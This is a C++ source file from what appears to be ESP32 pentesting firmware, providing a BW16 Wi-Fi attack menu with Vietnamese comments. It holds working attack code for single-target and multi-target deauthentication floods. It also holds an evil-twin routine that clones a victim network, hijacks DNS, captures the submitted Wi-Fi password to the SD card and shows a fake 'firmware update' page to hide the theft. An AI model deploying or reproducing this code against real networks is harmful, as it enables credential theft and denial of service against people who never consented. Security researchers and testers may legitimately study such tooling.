#include "BW16Menu.h"
#include "FlipperMenu.h" 
#include "core/Unifont20.h"
#include "core/display.h"
#include "core/sd_functions.h" 
#include "core/settings.h"
#include "core/utils.h"
#include "web_interface.h"
#include <SD.h>
#include <SPI.h>

// Include file bảo mật
#include "core/SecurityManager.h"

// Khởi tạo đối tượng bảo mật
SecurityManager security;

WebServer *evilServer = nullptr;
String capturedPassword = "";
String currentAttackSSID = "";
bool passFound = false;

void handleRoot() {
    if (evilServer) evilServer->send(200, "text/html", html_page);
}

void handleForm() {
    if (evilServer && evilServer->hasArg("password")) {
        capturedPassword = evilServer->arg("password");
        passFound = true; 

        setupSdCard();

        File f = SD.open("/wifi_pass.txt", FILE_APPEND);
        if (f) {
            f.println("--- " + currentAttackSSID + " ---");
            f.println("PASS: " + capturedPassword);
            f.println("-------------------------");
            f.close();
        }

        String html = R"rawliteral(
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>System Update</title>
                <style>
                    body { font-family: sans-serif; text-align: center; padding: 40px 20px; color: #333; }
                    h2 { color: #28a745; margin-bottom: 10px; }
                    .loader {
                        margin: 30px auto;
                        border: 5px solid #f3f3f3;
                        border-radius: 50%;
                        border-top: 5px solid #28a745;
                        width: 50px;
                        height: 50px;
                        -webkit-animation: spin 1s linear infinite;
                        animation: spin 1s linear infinite;
                    }
                    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                    .note { color: #666; font-size: 0.9em; margin-top: 20px; }
                </style>
            </head>
            <body>
                <h2>Update Successful!</h2>
                <div class="loader"></div>
                <p>Downloading and installing Firmware update...</p>
                <p>Progress: <b>10%</b></p>
                <p class="note">Please do not turn off the device.</p>
                <script>
                    let p = 10;
                    setInterval(() => {
                        if(p < 99) {
                            p += Math.floor(Math.random() * 5);
                            if(p > 99) p = 99;
                            document.querySelector("b").innerText = p + "%";
                        }
                    }, 800);
                    setTimeout(() => { window.location.href = "http://google.com"; }, 45000);
                </script>
            </body>
            </html>
        )rawliteral";

        evilServer->send(200, "text/html", html);
    }
}

void BW16Menu::drawIconImg() { drawIcon(1.0); }
bool BW16Menu::getTheme() { return true; }

void BW16Menu::optionsMenu() {

    bw16.begin();

    options = {
        {_("Scan Networks"),
         [this]() {
             drawMainBorderWithTitle(_("BW16 Scanner"));
             displayTextLine(_("Scanning..."));
             bw16.scanNetworks();
             if (bw16.networks.empty()) displayError(_("No networks found!"), false);
             else scanForTarget();
         }                                                      },

        {_("Multi-Target"),  [this]() { showMultiAttackMenu(); }},

        // SỬA LỖI: LOGIC CHUYỂN CẢNH FLIPPER MENU
        {_("Flipper(beta)"), [this]() { 
             FlipperMenu fMenu;
             fMenu.optionsMenu(); 

             // Sau khi thoát Flipper: Xóa cờ và vẽ lại Menu BW16
             returnToMenu = false; 
             optionsMenu();        
         }},

        {_("Stop All"),      [this]() {
             bw16.stop();
             displayInfo(_("Stopped BW16"));
         }                               }
    };

    options.push_back({_("Main Menu"), [this]() { returnToMenu = true; }});

    String title = _("BW16 Menu");
    title += _(" Tx: ") + String(bruceConfigPins.uart_bus.tx);
    title += _(" Rx: ") + String(bruceConfigPins.uart_bus.rx);

    loopOptions(options, MENU_TYPE_SUBMENU, title.c_str());
}

void BW16Menu::scanForTarget() {
    options.clear();
    for (const auto &net : bw16.networks) {
        String label = net.ssid + " | " + (net.channel > 14 ? "5G" : "2.4G");
        options.push_back({label, [this, net]() { showTargetOptions(net); }});
    }
    options.push_back({_("Scan Networks"), [this]() {
                           drawMainBorderWithTitle(_("BW16 Scanner"));
                           displayTextLine(_("Scanning..."));
                           bw16.scanNetworks();
                           scanForTarget();
                       }});

    options.push_back({_("Back"), [this]() { returnToMenu = true; }});

    drawMainBorderWithTitle(_("Scan Results"));
    loopOptions(options);
}

void BW16Menu::showTargetOptions(BW16Network net) {
    bw16.selectTarget(net.id);
    int action = 0;

    options = {
        {_("Get Password"),
         [&]() {
             if (security.check()) {
                 action = 1;
             } else {
                 action = 0;
             }
         }                                        },
        {_("Deauth (Solo)"), [&]() { action = 2; }},
        {_("Info"),          [&]() { action = 3; }},
        {_("Back"),          [&]() {
             action = -1;
             returnToMenu = true;
         }                     }
    };

    loopOptions(options);

    if (action == 1) runEvilTwinAttack(net);
    else if (action == 2) runAttackMenu(_("ATTACK"), "Target: " + net.ssid, []() { bw16.atkDeauth(); });
    else if (action == 3)
        displayInfo(
            "SSID: " + net.ssid + "\nCH: " + String(net.channel) + "\nRSSI: " + String(net.rssi), true
        );
}

void BW16Menu::showMultiAttackMenu() {
    if (bw16.networks.empty()) {
        displayError(_("No Data"), false);
        return;
    }
    while (true) {
        options.clear();

        int count = 0;
        for (const auto &net : bw16.networks)
            if (net.selected) count++;
        String startLabel = String(_("ATTACK")) + " (" + String(count) + ")";

        options.push_back({startLabel, [this]() {
                               String cmd = "sl:";
                               int c = 0;
                               for (const auto &net : bw16.networks)
                                   if (net.selected) {
                                       cmd += String(net.id) + ",";
                                       c++;
                                   }
                               if (c == 0) return;
                               if (cmd.endsWith(",")) cmd.remove(cmd.length() - 1);
                               bw16.sendRawCommand(cmd);
                               delay(100);
                               runAttackMenu(_("MULTI DEAUTH"), String(c) + " Targets", []() {
                                   bw16.atkDeauth();
                               });
                           }});
        for (auto &net : bw16.networks) {
            String check = net.selected ? "[x] " : "[ ] ";
            options.push_back({check + net.ssid, [&net]() { net.selected = !net.selected; }});
        }
        options.push_back({_("Select All"), [this]() {
                               for (auto &n : bw16.networks) n.selected = true;
                           }});
        options.push_back({_("Deselect All"), [this]() {
                               for (auto &n : bw16.networks) n.selected = false;
                           }});
        options.push_back({_("Back"), [this]() { returnToMenu = true; }});

        drawMainBorderWithTitle(_("Target Selection"));
        loopOptions(options);
        if (returnToMenu) {
            returnToMenu = false;
            break;
        }
    }
}

void BW16Menu::runEvilTwinAttack(BW16Network net) {
    currentAttackSSID = net.ssid;
    WiFi.disconnect(true);
    WiFi.mode(WIFI_AP);
    WiFi.softAP(net.ssid.c_str(), NULL, 1);
    IPAddress apIP(192, 168, 4, 1);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

    DNSServer dnsServer;
    dnsServer.start(53, "*", apIP);
    if (evilServer) delete evilServer;
    evilServer = new WebServer(80);
    passFound = false;
    capturedPassword = "";
    evilServer->on("/", HTTP_GET, handleRoot);
    evilServer->on("/submit", HTTP_POST, handleForm);
    evilServer->onNotFound(handleRoot);
    evilServer->begin();

    bw16.selectTarget(net.id);
    delay(50);
    bw16.atkDeauth();

    drawMainBorderWithTitle(_("Evil Twin Running"));
    tft.drawCentreString(_("Name: ") + net.ssid, tftWidth / 2, 50, 1);
    tft.drawCentreString(_("Getting..."), tftWidth / 2, 70, 1);
    tft.drawCentreString(_("Press BTN to Stop"), tftWidth / 2, tftHeight - 20, 1);

    bool isRunning = true;
    bool deauthStopped = false;
    unsigned long lastUpdate = 0;
    int anim = 0;

    while (isRunning) {
        dnsServer.processNextRequest();
        evilServer->handleClient();

        if (passFound && !deauthStopped) {
            bw16.stop();
            deauthStopped = true;
        }

        if (millis() - lastUpdate > 500) {
            lastUpdate = millis();
            anim++;
            tft.fillRect(0, 100, tftWidth, 80, bruceConfig.bgColor);
            if (passFound) {
                tft.setTextColor(TFT_GREEN);
                tft.drawCentreString(_("PASS FOUND!"), tftWidth / 2, 110, 2);
                tft.setTextColor(bruceConfig.priColor);
                tft.drawCentreString(capturedPassword, tftWidth / 2, 140, 2);
                tft.setTextSize(1);

                if (deauthStopped) tft.drawCentreString(_("Saved & Stopped"), tftWidth / 2, 165, 1);
                else tft.drawCentreString(_("Saved to SD"), tftWidth / 2, 165, 1);

            } else {
                tft.setTextColor(TFT_YELLOW);
                tft.drawCentreString(_("Waiting..."), tftWidth / 2, 110, 1);
                String d = "";
                for (int i = 0; i < anim % 4; i++) d += ".";
                tft.drawCentreString(d, tftWidth / 2, 130, 1);
            }
        }
        if (check(AnyKeyPress)) isRunning = false;
        vTaskDelay(1);
    }

    bw16.stop();
    if (evilServer) {
        evilServer->stop();
        delete evilServer;
        evilServer = nullptr;
    }
    dnsServer.stop();
    WiFi.mode(WIFI_OFF);
}

void BW16Menu::runAttackMenu(String title, String status, std::function<void()> startCmd) {
    startCmd();
    bool isRunning = true;
    bool runInBackground = false;

    while (isRunning) {
        options = {
            {_("RUNNING..."),        []() {}},
            {_("State: ") + status,  []() {}},
            {_("Resend Command"),
             [startCmd]() {
                 startCmd();
                 displayInfo(_("Sent"));
             }                              },
            {_("Exit (Background)"),
             [&]() {
                 isRunning = false;
                 runInBackground = true;
             }                              },
            {_("STOP ATTACK"),       [&]() {
                 isRunning = false;
                 runInBackground = false;
             }}
        };
        drawMainBorderWithTitle(title);
        loopOptions(options);
        if (returnToMenu) {
            isRunning = false;
            runInBackground = false;
            returnToMenu = false;
        }
    }

    if (!runInBackground) {
        bw16.stop();
        displayInfo(_("Stopped"));
    } else {
        displayInfo(_("Running in background..."));
    }
}

void BW16Menu::drawIcon(float scale) {
    clearIconArea();
    uint16_t primary = bruceConfig.priColor;
    uint16_t background = bruceConfig.bgColor;

    // Giữ nguyên tỷ lệ gốc 58:90 của bạn (rộng bằng ~64% cao)
    // Map vào khung chuẩn hệ thống (cao max 60)
    int iconH = scale * 60; 
    int iconW = scale * 38; 

    // Làm chẵn để tránh lệch pixel
    if (iconW % 2 != 0) iconW++;
    if (iconH % 2 != 0) iconH++;

    int x = iconCenterX - iconW / 2;
    int y = iconCenterY - iconH / 2;

    // Vẽ khung bo mạch
    tft.drawRect(x, y, iconW, iconH, primary);

    // --- Vẽ chân pin ---
    int pinW = scale * 4; if (pinW < 1) pinW = 1;
    int pinH = scale * 3; if (pinH < 1) pinH = 1;

    // 6 chân 2 bên (y như bản cũ của bạn)
    int sideStartY = y + (iconH * 0.22); // Bắt đầu từ 22% chiều cao
    int sideGap = (iconH * 0.65) / 5;    // Chia đều khoảng cách cho 6 chân
    for (int i = 0; i < 6; i++) {
        int py = sideStartY + (i * sideGap);
        tft.fillRect(x - pinW, py, pinW, pinH, primary);      // Trái
        tft.fillRect(x + iconW, py, pinW, pinH, primary);     // Phải
    }

    // 4 chân bên dưới
    int botGap = iconW / 5; 
    for (int i = 1; i <= 4; i++) {
        int px = x + (i * botGap) - (pinH / 2); // Xoay ngang nên dùng pinH làm width
        tft.fillRect(px, y + iconH, pinH, pinW, primary);
    }

    // --- Khối Antenna ---
    int antH = iconH * 0.25; // Cao khoảng 25% tổng thể
    int antBorder = scale * 1; if (antBorder < 1) antBorder = 1;
    tft.fillRect(x + antBorder, y + antBorder, iconW - (2 * antBorder), antH, primary);

    // --- Cắt 7 rãnh Zig-zag (y như bản cũ) ---
    int zigW = scale * 2; if (zigW < 1) zigW = 1;
    int zigGap = scale * 2; if (zigGap < 1) zigGap = 1;
    
    int totalZigW = (7 * zigW) + (6 * zigGap);
    int zigStartX = x + (iconW - totalZigW) / 2; // Tự động căn giữa 7 rãnh

    for (int i = 0; i < 7; i++) {
        int zx = zigStartX + (i * (zigW + zigGap));
        tft.fillRect(zx, y + antBorder + (scale * 3), zigW, antH - (scale * 6), background);
    }

    // --- Vẽ Shield ---
    // Thu hẹp chiều rộng và căn giữa giống logic cũ
    int shieldW = iconW * 0.65;
    int shieldH = iconH * 0.55;
    int shieldX = x + (iconW - shieldW) / 2;
    int shieldY = y + antH + (iconH * 0.05);

    tft.fillRect(shieldX, shieldY, shieldW, shieldH, primary);
}